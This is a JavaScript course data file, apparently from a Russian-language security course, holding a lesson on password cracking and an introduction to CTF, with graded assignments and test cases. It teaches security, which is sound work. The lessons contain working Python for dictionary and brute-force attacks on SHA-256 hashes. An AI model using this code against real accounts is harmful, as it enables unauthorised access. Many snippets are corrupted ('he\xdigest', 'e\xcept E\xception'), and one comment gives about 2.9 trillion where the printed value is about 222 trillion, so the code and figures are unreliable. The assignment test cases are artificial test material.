        { input: '5\n192.168.1.1 GET /\n10.0.0.1 POST /login\n192.168.1.1 GET /about\n192.168.1.1 GET /contact\n10.0.0.1 GET /', expectedOutput: '192.168.1.1 3\n10.0.0.1 2', description: 'Два IP с разной частотой' },
        { input: '3\n1.1.1.1 GET /\n2.2.2.2 GET /\n3.3.3.3 GET /', expectedOutput: '1.1.1.1 1\n2.2.2.2 1\n3.3.3.3 1', description: 'Одинаковая частота — лексикографический порядок' },
        { input: '1\n127.0.0.1 GET /index', expectedOutput: '127.0.0.1 1', description: 'Одна запись' },
      ],
      points: 20,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 19: Перебор паролей
  // ──────────────────────────────────────────
  {
    slug: 'password-brute-force',
    title: 'Перебор паролей',
    description: 'Словарные атаки, брутфорс, rainbow tables, оценка стойкости паролей',
    content: `# Перебор паролей

## Как хранятся пароли

Ответственные сервисы **никогда** не хранят пароли в открытом виде. Хранят хеш:

\`\`\`python
import hashlib

def store_password(password):
    """Хеширование пароля для хранения."""
    return hashlib.sha256(password.encode()).he\xdigest()

# В базе данных:
# username: admin
# password_hash: 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918

print(store_password('admin'))
# 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
\`\`\`

## Словарная атака (Dictionary Attack)

Проверяем пароли из списка популярных паролей:

\`\`\`python
import hashlib

def dictionary_attack(target_hash, wordlist):
    """Словарная атака — перебор по словарю."""
    for word in wordlist:
        word_hash = hashlib.sha256(word.encode()).he\xdigest()
        if word_hash == target_hash:
            return word
    return None

# Популярные пароли
common_passwords = [
    '123456', 'password', 'qwerty', 'admin', 'letmein',
    'welcome', 'monkey', '123456789', '12345678', 'abc123'
]

target = hashlib.sha256('admin'.encode()).he\xdigest()
result = dictionary_attack(target, common_passwords)
print(f'Пароль найден: {result}')  # admin
\`\`\`

## Брутфорс (Brute Force)

Полный перебор всех комбинаций:

\`\`\`python
import hashlib
import itertools
import string

def brute_force(target_hash, charset, max_length):
    """Полный перебор до заданной длины."""
    for length in range(1, max_length + 1):
        for combo in itertools.product(charset, repeat=length):
            password = ''.join(combo)
            if hashlib.sha256(password.encode()).he\xdigest() == target_hash:
                return password
    return None

# Оценка времени перебора
def estimate_combinations(charset_size, max_length):
    """Сколько комбинаций нужно проверить."""
    total = sum(charset_size ** i for i in range(1, max_length + 1))
    return total

# Только цифры, 4 символа: 10^1 + 10^2 + 10^3 + 10^4 = 11110
print(estimate_combinations(10, 4))   # 11110

# Буквы + цифры, 8 символов: ~2.9 трлн
print(estimate_combinations(62, 8))   # 221919451578090
\`\`\`

## Защита: соль (salt)

\`\`\`python
import hashlib
import os

def hash_with_salt(password):
    """Хеширование с солью."""
    salt = os.urandom(16).hex()  # случайная соль
    salted_hash = hashlib.sha256((salt + password).encode()).he\xdigest()
    return f'{salt}:{salted_hash}'

def verify_password(password, stored):
    """Проверка пароля."""
    salt, expected_hash = stored.split(':')
    actual_hash = hashlib.sha256((salt + password).encode()).he\xdigest()
    return actual_hash == expected_hash

stored = hash_with_salt('mypassword')
print(verify_password('mypassword', stored))  # True
print(verify_password('wrong', stored))       # False
\`\`\`

## Оценка стойкости пароля

| Пароль | Время подбора |
|--------|--------------|
| 1234 | мгновенно |
| password | мгновенно (словарь) |
| Tr0ub4dor | минуты |
| correct horse battery staple | миллионы лет |`,
    duration: 55,
    assignment: {
      title: 'Словарная атака',
      description: 'На первой строке дан SHA-256 хеш пароля (hex, 64 символа). На второй строке дано число N — размер словаря. Далее N строк — слова из словаря. Найдите слово, SHA-256 хеш которого совпадает с данным. Если найдено — выведите слово, иначе — NOT FOUND.',
      difficulty: 'hard',
      starterCode: 'import hashlib\n\ntarget_hash = input()\nn = int(input())\n\n# Считайте словарь и найдите пароль\n\n# Ваш код здесь\n',
      testCases: [
        { input: '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918\n3\nhello\nadmin\nworld', expectedOutput: 'admin', description: 'Пароль admin в словаре' },
        { input: '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8\n2\nhello\npassword', expectedOutput: 'password', description: 'Пароль password' },
        { input: 'aaaa\n2\nfoo\nbar', expectedOutput: 'NOT FOUND', description: 'Пароля нет в словаре' },
      ],
      points: 20,
    },
  },

  // ──────────────────────────────────────────
  // УРОК 20: Введение в CTF
  // ──────────────────────────────────────────
  {
    slug: 'ctf-introduction',
    title: 'Введение в CTF',
    description: 'Форматы соревнований, типы задач, решение простых CTF-задач',
    content: `# Введение в CTF

## Что такое CTF?

**CTF** (Capture The Flag) — соревнования по информационной безопасности. Участники решают задачи и находят скрытые «флаги» — специальные строки формата \`flag{...}\`.

## Форматы CTF

### Jeopardy (Своя игра)
Набор задач по категориям. За каждую задачу — очки. Побеждает команда с наибольшим счётом.

Категории:
- **Crypto** — криптография
- **Stego** — стеганография
- **Web** — веб-безопасность
- **Forensics** — форензика
- **Reverse** — реверс-инжиниринг
- **Misc** — разное

### Attack-Defense
Команды защищают свои серверы и атакуют серверы противников.

## Типичные приёмы CTF

### 1. Декодирование цепочек

\`\`\`python
import base64

# Часто флаг закодирован несколько раз
encoded = 'Wm14aFozdHNNMU5mTVROZk0wUmgnfQ=='

# Шаг 1: Base64
step1 = base64.b64decode(encoded).decode()
print(f'Шаг 1: {step1}')

# Шаг 2: ещё Base64?
try:
    step2 = base64.b64decode(step1).decode()
    print(f'Шаг 2: {step2}')
e\xcept E\xception:
    print('Не Base64, пробуем другое...')
\`\`\`

### 2. ROT13 (Цезарь со сдвигом 13)

\`\`\`python
import codecs

# ROT13 — частый приём в CTF
encoded = 'synt{r4fl_ebg13}'
decoded = codecs.decode(encoded, 'rot_13')
print(decoded)  # flag{e4sy_rot13}
\`\`\`

### 3. Hex-строки

\`\`\`python
# Флаг в hex
hex_flag = '666c61677b6833785f31735f6630725f6e30306273'
flag = bytes.fromhex(hex_flag).decode('ascii')
print(flag)  # flag{h3x_1s_f0r_n00bs... (и т.д.)
\`\`\`

### 4. Комбинация методов

\`\`\`python
import base64
import hashlib

def solve_ctf_chain(data):
    """Решение цепочки кодирований."""
    print(f'Исходные данные: {data}')

    # Пробуем Base64
    try:
        decoded = base64.b64decode(data).decode('utf-8')
        print(f'Base64 → {decoded}')
        data = decoded
    e\xcept E\xception:
        pass

    # Пробуем hex
    try:
        decoded = bytes.fromhex(data).decode('ascii')
        print(f'Hex → {decoded}')
        data = decoded
    e\xcept E\xception:
        pass

    # Пробуем ROT13
    import codecs
    rotated = codecs.decode(data, 'rot_13')
    if 'flag' in rotated:
        print(f'ROT13 → {rotated}')
        return rotated

    return data
\`\`\`

## Площадки для практики

- **picoCTF** (picoctf.org) — для начинающих
- **CTFtime** (ctftime.org) — расписание соревнований
- **HackTheBox** — виртуальные машины для взлома
- **OverTheWire** (overthewire.org) — варгеймы по уровням

## Советы для CTF

1. **Всегда проверяйте кодировки**: Base64, hex, ROT13
2. **Смотрите на формат флага**: обычно \`flag{...}\` или \`ctf{...}\`
3. **Используйте CyberChef** — онлайн-инструмент для декодирования
4. **Записывайте шаги** — CTF writeups помогают учиться`,
    duration: 55,
    assignment: {
      title: 'Декодирование флага',
      description: 'На первой строке дана строка — закодированный флаг. На второй строке — название метода кодирования: base64, hex или caesar-N (где N — сдвиг, например caesar-3). Декодируйте и выведите результат. Для caesar используйте английский алфавит (a-z, строчные), нелатинские символы оставьте без изменений.',
      difficulty: 'hard',
      starterCode: 'import base64\n\ndata = input()\nmethod = input()\n\n# Декодируйте данные указанным методом\n# Выведите результат\n\n# Ваш код здесь\n',
      testCases: [
        { input: 'ZmxhZ3t0ZXN0fQ==\nbase64', expectedOutput: 'flag{test}', description: 'Base64 декодирование' },
        { input: '666c61677b68657821237d\nhex', expectedOutput: 'flag{hex!#}', description: 'Hex декодирование' },
        { input: 'iodj{fdhvdu}\ncaesar-3', expectedOutput: 'flag{caesar}', description: 'Шифр Цезаря сдвиг 3' },
      ],
      points: 20,
    },
  },
];
